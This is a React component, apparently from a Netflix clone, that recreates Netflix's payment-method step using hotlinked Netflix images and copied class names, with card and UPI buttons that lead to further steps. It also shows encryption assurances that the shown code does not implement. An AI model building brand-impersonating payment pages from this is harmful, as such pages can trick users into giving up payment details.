import React, { useState } from "react";
import Header from "../ClientSite/Global/Header";
import Footer from "../ClientSite/Global/Footer";
import { useNavigate } from "react-router-dom";


function Step4() {
    const navigate=useNavigate();
    return (
        <>
            <div className="client_conteint">
                {/* <Header /> */}
                <div
                    className="text-white container contentWrapper text-center"
                    style={{ paddingTop: "150px", paddingBottom: "100px" }}
                >
                    <div className="pb-2">
                        <img
                            src="https://assets.nflxext.com/ffe/siteui/acquisition/simplicity/Lock.png"
                            alt=""
                            height="75"
                        />
                    </div>
                    <div className="pt-5">STEP 2 OF 2</div>
                    <h3>Choose how to pay</h3>
                    <div className="p-3">
                        <span>
                            Your payment is encrypted and you can change your <br /> payment method at anytime.
                        </span><br /><br />
                        <span>
                            <b> Secure for peace of mind. <br />
                                Cancel easily online.</b>
                        </span>
                    </div>
                    <div className="text-end w-75">End-to-end encrypted 🔐</div>
                    <div className="text-center pt-2">

                        <div className="d-flex justify-content-center">
                            <button onClick={()=>navigate("/step5_card")} class=" align-items-center paymentTab overrides paymentPicker standardHeight default-ltr-cache-22elhg e1ff4m3w2" id="creditOrDebitCardDisplayStringId" data-uia="payment-choice+creditOrDebitOption" type="button">
                                <div class="mopNameAndLogos">
                                    <div class="paymentTab--text card-type-text">
                                        <span class="selectionLabel p-5">Credit or Debit Card</span>
                                    </div>
                                    <div class="logosContainer">
                                        <span class="logos logos-inline" data-uia="cardLogos-comp" aria-label="We accept Visa, Mastercard and Diners Club.">
                                            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="Visa" class="logoIcon VISA default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png 2x" data-uia="logoIcon-VISA" />
                                            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="Mastercard" class="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png 2x" data-uia="logoIcon-MASTERCARD" />
                                            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/DINERS.png" alt="Diners Club" class="logoIcon DINERS default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/DINERS@2x.png 2x" data-uia="logoIcon-DINERS" />
                                        </span>
                                    </div>
                                </div>
                                <span class="arrow">
                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-mirrorinrtl="true" class="default-ltr-cache-4z3qvp e1svuwfo1" data-name="ChevronRight" aria-labelledby=":rc:" aria-hidden="true">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.5859 12L8.29303 19.2928L9.70725 20.7071L17.7072 12.7071C17.8948 12.5195 18.0001 12.2652 18.0001 12C18.0001 11.7347 17.8948 11.4804 17.7072 11.2928L9.70724 3.29285L8.29303 4.70706L15.5859 12Z" fill="currentColor">
                                        </path>
                                    </svg>
                                </span>
                            </button>

                        </div>

                        <div className="d-flex justify-content-center">
                            <button onClick={()=>navigate("/step5_upi")} class=" align-items-center paymentTab overrides paymentPicker standardHeight default-ltr-cache-22elhg e1ff4m3w2" id="creditOrDebitCardDisplayStringId" data-uia="payment-choice+creditOrDebitOption" type="button">
                                <div class="mopNameAndLogos">
                                    <div class="paymentTab--text card-type-text">
                                        <span class="selectionLabel p-5">UPI AutoPay</span>
                                    </div>
                                    <div class="logosContainer">
                                        <span class="logos logos-inline" data-uia="cardLogos-comp" aria-label="We accept BHIM, Paytm, PhonePe, Amazon Pay and Google Pay.">
                                            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/BHIM.png" alt="BHIM" class="logoIcon BHIM default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/BHIM@2x.png 2x" data-uia="logoIcon-BHIM"/>
                                                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/PAYTM.png" alt="Paytm" class="logoIcon PAYTM default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/PAYTM@2x.png 2x" data-uia="logoIcon-PAYTM" />
                                                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/PHONEPE.png" alt="PhonePe" class="logoIcon PHONEPE default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/PHONEPE@2x.png 2x" data-uia="logoIcon-PHONEPE" />
                                                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMAZONPAY.png" alt="Amazon Pay" class="logoIcon AMAZONPAY default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMAZONPAY@2x.png 2x" data-uia="logoIcon-AMAZONPAY" />
                                                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/GPAY.png" alt="Google Pay" class="logoIcon GPAY default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/GPAY@2x.png 2x" data-uia="logoIcon-GPAY" />
                                        </span>
                                    </div>
                                </div>
                                <span class="arrow">
                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-mirrorinrtl="true" class="default-ltr-cache-4z3qvp e1svuwfo1" data-name="ChevronRight" aria-labelledby=":rc:" aria-hidden="true">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.5859 12L8.29303 19.2928L9.70725 20.7071L17.7072 12.7071C17.8948 12.5195 18.0001 12.2652 18.0001 12C18.0001 11.7347 17.8948 11.4804 17.7072 11.2928L9.70724 3.29285L8.29303 4.70706L15.5859 12Z" fill="currentColor">
                                        </path>
                                    </svg>
                                </span>
                            </button>

                        </div>


                    </div>
                </div>
                {/* <Footer /> */}
            </div>
        </>
    );
}

export default Step4;
